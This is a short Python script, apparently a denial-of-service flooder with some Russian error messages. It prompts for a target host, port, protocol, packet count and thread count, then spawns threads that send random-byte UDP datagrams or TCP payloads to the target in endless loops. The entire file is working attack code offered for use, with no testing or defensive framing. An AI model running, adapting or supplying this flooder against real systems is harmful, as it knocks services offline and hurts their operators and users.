
import signal

import socket
import random

import threading
import sys
import os
from os import system, name



ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
bufsize = int(input("Bufsize: "))

def run():
	data = os.urandom(1000)
	i = random.choice(("[*]","[!]","[#]"))


	while True:
		s = None
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
				print(i + str(addr))

		except socket.gaierror as e:
			print(f"error host {ip}.  : {e}")
		except socket.error as e:
			print(f"Socket Error: {e}. Номер ошибки: {e.errno}")
		except OSError as e:
			print(f"Error ОС: {e}. Номер ошибки: {e.errno}")
		except Exception as e:
			print(f"Error: {type(e).__name__}: {e}")
		finally:
			if s is not None:
				s.close()
def run2():
	data = os.urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TCP!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()


